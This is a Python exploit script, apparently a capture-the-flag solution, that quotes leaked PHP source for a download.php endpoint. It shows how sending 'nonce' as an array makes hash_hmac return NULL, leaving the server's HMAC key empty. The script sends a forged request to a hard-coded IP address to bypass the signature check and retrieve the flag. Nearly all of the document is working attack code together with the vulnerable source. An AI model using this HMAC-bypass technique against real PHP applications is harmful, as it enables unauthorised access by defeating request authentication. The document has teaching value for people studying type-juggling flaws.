import requests
import hmac
import hashlib

'''
In /robots.txt:

User-agent: *
Disallow: /backup_files

In /backup_files/download.txt (download.php source code):
    include_once 'config.php'; 
...
    function validate_hash(){ <-- $S_KEY is not provided
	if(empty($_POST['hash']) || empty($_POST['storagesv'])){
            die('Cannot verify server');
        }
        if(isset($_POST['nonce'])){
            $S_KEY = hash_hmac('sha256',$_POST['nonce'],$S_KEY); <-- if nonce is array, it returns NULL
        }
        $final_hash = hash_hmac('sha256',$_POST['storagesv'],$S_KEY); <-- NULL key is possible
        if ($final_hash !== $_POST['hash']){
            die('Cannot verify server');
	}

    }

...
    if(isset($_POST['messid'])){

	$messid = $_POST['messid'];
	validate_hash();
	$url="";
	if($_POST['storagesv'] === 'message1.local' or $_POST['storagesv'] === 'message2.local'){
		$url = 'http://'.$_POST['storagesv'].'/';
	} elseif ($_POST['storagesv']==="gimmeflag") {
		die('AceBear{******}');
	}

'''

r = requests.post('http://35.198.201.83/download.php', data={
	'nonce[]': '1',
	'storagesv': 'gimmeflag',
	'hash': hmac.new('', 'gimmeflag', hashlib.sha256).hexdigest(),
	'messid': 'anything'
	})
print r.text